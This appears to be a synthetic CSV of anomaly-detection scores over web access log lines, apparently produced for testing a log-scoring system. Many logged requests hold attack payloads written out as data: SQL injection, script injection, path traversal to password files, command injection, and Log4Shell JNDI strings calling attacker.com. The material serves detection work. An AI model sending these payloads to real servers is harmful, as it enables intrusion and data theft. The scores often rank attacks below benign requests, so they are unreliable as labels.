score_content,score_session,score_fused,line
5.8569231033325195,,5.8569231033325195,30.2.80.239 - - [10/Jan/2025:12:00:40 +0100] "GET /search?q=camera HTTP/1.1" 200 17216 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2908584177494049,,0.2908584177494049,6.148.195.80 - - [10/Jan/2025:12:00:40 +0100] "GET /wp-login.php HTTP/1.1" 200 10339 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
5.954768657684326,,5.954768657684326,172.31.70.39 - - [10/Jan/2025:12:00:41 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 14554 "https://example.com/" "curl/7.68.0"
0.3192732334136963,,0.3192732334136963,141.82.70.37 - - [10/Jan/2025:12:00:41 +0100] "GET /.git/config HTTP/1.1" 200 11579 "https://twitter.com/" "python-requests/2.31.0"
5.850677013397217,,5.850677013397217,139.114.13.34 - - [10/Jan/2025:12:00:42 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 201 11199 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.5362324714660645,,0.5362324714660645,101.46.181.153 - - [10/Jan/2025:12:00:47 +0100] "GET /.env HTTP/1.1" 200 14074 "https://twitter.com/" "nikto/2.5.0"
7.777938365936279,,7.777938365936279,21.250.237.194 - - [10/Jan/2025:12:00:49 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 302 17581 "https://twitter.com/" "nikto/2.5.0"
0.20683974027633667,,0.20683974027633667,176.165.182.197 - - [10/Jan/2025:12:00:50 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 10270 "https://news.ycombinator.com/" "nikto/2.5.0"
11.245233535766602,,11.245233535766602,67.234.94.101 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 401 1263 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6809735298156738,,1.6809735298156738,90.123.119.217 - - [10/Jan/2025:12:00:53 +0100] "GET /admin HTTP/1.1" 200 3799 "https://example.com/" "curl/7.68.0"
0.2166857123374939,,0.2166857123374939,210.183.204.28 - - [10/Jan/2025:12:00:55 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13393 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.859462261199951,,5.859462261199951,152.106.62.159 - - [10/Jan/2025:12:01:00 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13233 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
5.824684143066406,,5.824684143066406,209.178.152.111 - - [10/Jan/2025:12:01:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 6923 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
5.6909637451171875,,5.6909637451171875,190.239.183.147 - - [10/Jan/2025:12:01:03 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2652 "-" "nikto/2.5.0"
5.831110000610352,,5.831110000610352,46.79.245.104 - - [10/Jan/2025:12:01:07 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14688 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.4989273250102997,,0.4989273250102997,24.56.210.36 - - [10/Jan/2025:12:01:07 +0100] "GET /.env HTTP/1.1" 200 2114 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.875426769256592,,5.875426769256592,115.51.53.175 - - [10/Jan/2025:12:01:12 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 19037 "https://example.com/" "sqlmap/1.5.10#stable"
12.75097370147705,,12.75097370147705,184.252.235.89 - - [10/Jan/2025:12:01:16 +0100] "GET /logout HTTP/1.1" 404 890 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.539984703063965,,11.539984703063965,16.95.231.141 - - [10/Jan/2025:12:01:16 +0100] "GET /.env HTTP/1.1" 401 602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.763089179992676,,5.763089179992676,222.8.61.111 - - [10/Jan/2025:12:01:21 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9347 "https://example.com/" "dirb/2.22"
0.5130610466003418,,0.5130610466003418,170.45.122.36 - - [10/Jan/2025:12:01:26 +0100] "GET /.env HTTP/1.1" 200 7021 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
12.656218528747559,,12.656218528747559,74.224.172.33 - - [10/Jan/2025:12:01:29 +0100] "GET /profile HTTP/1.1" 400 315 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.2797718048095703,,2.2797718048095703,169.112.250.254 - - [10/Jan/2025:12:01:29 +0100] "GET /../../etc/passwd HTTP/1.1" 302 16048 "-" "curl/7.68.0"
12.479474067687988,,12.479474067687988,155.239.109.160 - - [10/Jan/2025:12:01:30 +0100] "GET /server-status HTTP/1.1" 401 1424 "https://news.ycombinator.com/" "curl/7.68.0"
0.19724373519420624,,0.19724373519420624,48.109.155.2 - - [10/Jan/2025:12:01:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 7497 "https://www.google.com/" "nikto/2.5.0"
12.55572509765625,,12.55572509765625,94.9.251.10 - - [10/Jan/2025:12:01:39 +0100] "GET /server-status HTTP/1.1" 404 1180 "https://example.com/" "nikto/2.5.0"
1.5751391649246216,,1.5751391649246216,252.220.252.193 - - [10/Jan/2025:12:01:39 +0100] "GET /phpmyadmin HTTP/1.1" 200 17349 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.5287262201309204,,1.5287262201309204,176.163.139.205 - - [10/Jan/2025:12:01:43 +0100] "GET /phpmyadmin HTTP/1.1" 200 2658 "https://twitter.com/" "python-requests/2.31.0"
1.9075137376785278,,1.9075137376785278,232.121.147.188 - - [10/Jan/2025:12:01:43 +0100] "GET / HTTP/1.1" 200 16898 "https://news.ycombinator.com/" "curl/7.68.0"
1.6494262218475342,,1.6494262218475342,178.237.153.192 - - [10/Jan/2025:12:01:45 +0100] "GET /logout HTTP/1.1" 200 1257 "https://twitter.com/" "curl/7.68.0"
5.993043899536133,,5.993043899536133,14.169.254.75 - - [10/Jan/2025:12:01:47 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 18871 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.572251319885254,,12.572251319885254,65.34.158.72 - - [10/Jan/2025:12:01:50 +0100] "GET /phpmyadmin HTTP/1.1" 401 569 "https://example.com/" "python-requests/2.31.0"
11.38247013092041,,11.38247013092041,169.115.95.207 - - [10/Jan/2025:12:01:50 +0100] "GET /assets/app.js HTTP/1.1" 404 309 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.1801342964172363,,2.1801342964172363,88.252.22.248 - - [10/Jan/2025:12:01:55 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 304 1184 "https://twitter.com/" "curl/7.68.0"
7.926413059234619,,7.926413059234619,170.113.186.164 - - [10/Jan/2025:12:01:56 +0100] "GET /search?q=phone HTTP/1.1" 304 7897 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6345919370651245,,1.6345919370651245,194.210.30.14 - - [10/Jan/2025:12:02:00 +0100] "GET /profile HTTP/1.1" 200 8763 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
8.045154571533203,,8.045154571533203,60.98.175.181 - - [10/Jan/2025:12:02:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 302 17549 "https://news.ycombinator.com/" "dirb/2.22"
1.4949231147766113,,1.4949231147766113,98.174.81.247 - - [10/Jan/2025:12:02:05 +0100] "GET /server-status HTTP/1.1" 200 14806 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.4767159223556519,,1.4767159223556519,86.70.69.206 - - [10/Jan/2025:12:02:09 +0100] "GET /server-status HTTP/1.1" 200 9032 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.277127265930176,,2.277127265930176,188.173.151.198 - - [10/Jan/2025:12:02:14 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 304 8023 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.12740458548069,,0.12740458548069,173.3.213.18 - - [10/Jan/2025:12:02:16 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 446 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2038552165031433,,0.2038552165031433,65.50.9.7 - - [10/Jan/2025:12:02:16 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 9383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
17.433149337768555,,17.433149337768555,32.182.246.31 - - [10/Jan/2025:12:02:20 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 429 1306 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.169421195983887,,11.169421195983887,48.65.76.120 - - [10/Jan/2025:12:02:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 403 1424 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.5557358264923096,,1.5557358264923096,71.199.16.98 - - [10/Jan/2025:12:02:23 +0100] "GET /dashboard HTTP/1.1" 200 2524 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
5.9161176681518555,,5.9161176681518555,126.251.238.52 - - [10/Jan/2025:12:02:23 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2374 "https://www.google.com/" "dirb/2.22"
0.21916133165359497,,0.21916133165359497,56.158.165.28 - - [10/Jan/2025:12:02:28 +0100] "GET /../../etc/passwd HTTP/1.1" 200 14231 "https://example.com/" "nikto/2.5.0"
1.5473958253860474,,1.5473958253860474,199.115.5.230 - - [10/Jan/2025:12:02:28 +0100] "GET /phpmyadmin HTTP/1.1" 200 8311 "https://www.google.com/" "nikto/2.5.0"
2.330068826675415,,2.330068826675415,39.180.85.232 - - [10/Jan/2025:12:02:33 +0100] "GET /wp-login.php HTTP/1.1" 301 8830 "https://twitter.com/" "dirb/2.22"
5.977807521820068,,5.977807521820068,217.187.200.208 - - [10/Jan/2025:12:02:33 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 13335 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.989869594573975,,5.989869594573975,240.254.92.86 - - [10/Jan/2025:12:02:34 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17640 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.557296872138977,,1.557296872138977,21.216.118.195 - - [10/Jan/2025:12:02:34 +0100] "GET /phpmyadmin HTTP/1.1" 200 11243 "https://www.google.com/" "python-requests/2.31.0"
0.5140619874000549,,0.5140619874000549,179.100.230.28 - - [10/Jan/2025:12:02:35 +0100] "GET /.env HTTP/1.1" 204 9893 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
7.8721022605896,,7.8721022605896,10.50.7.185 - - [10/Jan/2025:12:02:35 +0100] "GET /search?q=camera HTTP/1.1" 302 4685 "https://www.google.com/" "python-requests/2.31.0"
5.864117622375488,,5.864117622375488,248.5.10.87 - - [10/Jan/2025:12:02:38 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 14822 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3357210159301758,,0.3357210159301758,118.241.174.223 - - [10/Jan/2025:12:02:43 +0100] "GET /.git/config HTTP/1.1" 200 17241 "https://twitter.com/" "curl/7.68.0"
2.413799285888672,,2.413799285888672,168.5.121.233 - - [10/Jan/2025:12:02:44 +0100] "GET /index.html HTTP/1.1" 302 16120 "-" "python-requests/2.31.0"
0.2213323563337326,,0.2213323563337326,232.79.211.204 - - [10/Jan/2025:12:02:45 +0100] "GET /assets/app.css HTTP/1.1" 200 1737 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.588990211486816,,12.588990211486816,30.128.153.205 - - [10/Jan/2025:12:02:49 +0100] "GET /phpmyadmin HTTP/1.1" 400 217 "-" "Wget/1.20.3 (linux-gnu)"
0.5495604872703552,,0.5495604872703552,140.36.83.215 - - [10/Jan/2025:12:02:50 +0100] "GET /.env HTTP/1.1" 200 18973 "-" "Wget/1.20.3 (linux-gnu)"
1.5344666242599487,,1.5344666242599487,194.107.44.179 - - [10/Jan/2025:12:02:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 4728 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.2975309193134308,,0.2975309193134308,200.41.5.226 - - [10/Jan/2025:12:02:55 +0100] "GET /wp-login.php HTTP/1.1" 200 12425 "-" "nikto/2.5.0"
3.635263681411743,,3.635263681411743,228.73.107.178 - - [10/Jan/2025:12:02:55 +0100] "GET /phpmyadmin HTTP/1.1" 302 19555 "https://www.google.com/" "nikto/2.5.0"
5.951982021331787,,5.951982021331787,62.241.45.157 - - [10/Jan/2025:12:02:56 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 13601 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.700210452079773,,1.700210452079773,90.108.2.143 - - [10/Jan/2025:12:02:57 +0100] "GET /about HTTP/1.1" 201 9969 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6594253778457642,,1.6594253778457642,130.57.119.198 - - [10/Jan/2025:12:02:57 +0100] "GET /contact HTTP/1.1" 201 17785 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.409261465072632,,2.409261465072632,128.46.41.172 - - [10/Jan/2025:12:02:59 +0100] "GET /.git/config HTTP/1.1" 304 15645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.7034735679626465,,5.7034735679626465,158.207.228.195 - - [10/Jan/2025:12:03:04 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11054 "-" "nikto/2.5.0"
0.24899476766586304,,0.24899476766586304,125.132.30.19 - - [10/Jan/2025:12:03:04 +0100] "GET /assets/app.js HTTP/1.1" 200 1052 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.4825688600540161,,1.4825688600540161,59.200.29.84 - - [10/Jan/2025:12:03:08 +0100] "GET /server-status HTTP/1.1" 200 10772 "-" "Wget/1.20.3 (linux-gnu)"
1.5599815845489502,,1.5599815845489502,19.121.150.125 - - [10/Jan/2025:12:03:09 +0100] "GET /api/products HTTP/1.1" 200 7330 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.21347194910049438,,0.21347194910049438,35.118.185.50 - - [10/Jan/2025:12:03:10 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 12338 "https://example.com/" "sqlmap/1.5.10#stable"
2.3095998764038086,,2.3095998764038086,72.35.29.219 - - [10/Jan/2025:12:03:11 +0100] "GET /wp-login.php HTTP/1.1" 301 2054 "https://news.ycombinator.com/" "nikto/2.5.0"
5.815818786621094,,5.815818786621094,155.41.203.204 - - [10/Jan/2025:12:03:14 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9771 "https://twitter.com/" "curl/7.68.0"
1.7243107557296753,,1.7243107557296753,126.221.56.152 - - [10/Jan/2025:12:03:18 +0100] "GET /about HTTP/1.1" 200 17197 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
3.5283613204956055,,3.5283613204956055,64.84.112.149 - - [10/Jan/2025:12:03:20 +0100] "GET /server-status HTTP/1.1" 302 8182 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.8637794256210327,,1.8637794256210327,11.254.121.188 - - [10/Jan/2025:12:03:21 +0100] "GET / HTTP/1.1" 200 1549 "-" "python-requests/2.31.0"
8.02232837677002,,8.02232837677002,116.127.62.22 - - [10/Jan/2025:12:03:24 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 3311 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.8256378173828125,,5.8256378173828125,5.123.172.79 - - [10/Jan/2025:12:03:25 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 3073 "https://news.ycombinator.com/" "curl/7.68.0"
569.6439208984375,,569.6439208984375,198.36.224.181 - - [10/Jan/2025:12:03:29 +0100] "GET / HTTP/1.1" 500 949 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
12.786609649658203,,12.786609649658203,99.229.177.86 - - [10/Jan/2025:12:03:31 +0100] "GET /admin HTTP/1.1" 401 144 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.6222312450408936,,3.6222312450408936,159.226.86.189 - - [10/Jan/2025:12:03:34 +0100] "GET /api/products HTTP/1.1" 304 2752 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.29645565152168274,,0.29645565152168274,120.159.11.94 - - [10/Jan/2025:12:03:39 +0100] "GET /wp-login.php HTTP/1.1" 200 12079 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.5419971942901611,,1.5419971942901611,36.252.86.62 - - [10/Jan/2025:12:03:44 +0100] "GET /phpmyadmin HTTP/1.1" 200 6808 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.6151857376098633,,3.6151857376098633,83.91.230.69 - - [10/Jan/2025:12:03:49 +0100] "GET /api/products HTTP/1.1" 302 7487 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.783594131469727,,5.783594131469727,129.135.213.32 - - [10/Jan/2025:12:03:51 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 16032 "https://twitter.com/" "nikto/2.5.0"
1.677121639251709,,1.677121639251709,205.173.243.178 - - [10/Jan/2025:12:03:56 +0100] "GET /logout HTTP/1.1" 200 12163 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.589654922485352,,11.589654922485352,246.245.20.28 - - [10/Jan/2025:12:03:59 +0100] "GET /.env HTTP/1.1" 403 590 "https://example.com/" "curl/7.68.0"
5.956040859222412,,5.956040859222412,134.244.161.6 - - [10/Jan/2025:12:03:59 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 6793 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2180911898612976,,0.2180911898612976,114.189.166.6 - - [10/Jan/2025:12:04:04 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13866 "https://www.google.com/" "python-requests/2.31.0"
16.6920108795166,,16.6920108795166,166.86.106.149 - - [10/Jan/2025:12:04:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 400 1064 "https://example.com/" "sqlmap/1.5.10#stable"
0.23130455613136292,,0.23130455613136292,34.230.203.79 - - [10/Jan/2025:12:04:07 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18687 "https://example.com/" "curl/7.68.0"
7.903900146484375,,7.903900146484375,38.91.73.117 - - [10/Jan/2025:12:04:08 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 304 1650 "https://twitter.com/" "curl/7.68.0"
1.655387043952942,,1.655387043952942,215.182.178.232 - - [10/Jan/2025:12:04:09 +0100] "GET /logout HTTP/1.1" 200 5846 "https://www.google.com/" "sqlmap/1.5.10#stable"
568.15673828125,,568.15673828125,33.113.67.95 - - [10/Jan/2025:12:04:10 +0100] "GET /wp-login.php HTTP/1.1" 503 1176 "https://www.google.com/" "curl/7.68.0"
569.3754272460938,,569.3754272460938,96.115.139.250 - - [10/Jan/2025:12:04:14 +0100] "GET /dashboard HTTP/1.1" 500 302 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7223351001739502,,1.7223351001739502,197.38.243.118 - - [10/Jan/2025:12:04:16 +0100] "GET /admin HTTP/1.1" 200 16464 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.5705368518829346,,1.5705368518829346,122.230.75.249 - - [10/Jan/2025:12:04:16 +0100] "GET /dashboard HTTP/1.1" 204 9784 "https://www.google.com/" "python-requests/2.31.0"
5.813699245452881,,5.813699245452881,188.123.231.11 - - [10/Jan/2025:12:04:20 +0100] "GET /search?q=camera HTTP/1.1" 200 3780 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5116774439811707,,0.5116774439811707,115.92.24.84 - - [10/Jan/2025:12:04:20 +0100] "GET /.env HTTP/1.1" 201 7320 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.790567398071289,,7.790567398071289,51.6.22.138 - - [10/Jan/2025:12:04:25 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 9207 "-" "nikto/2.5.0"
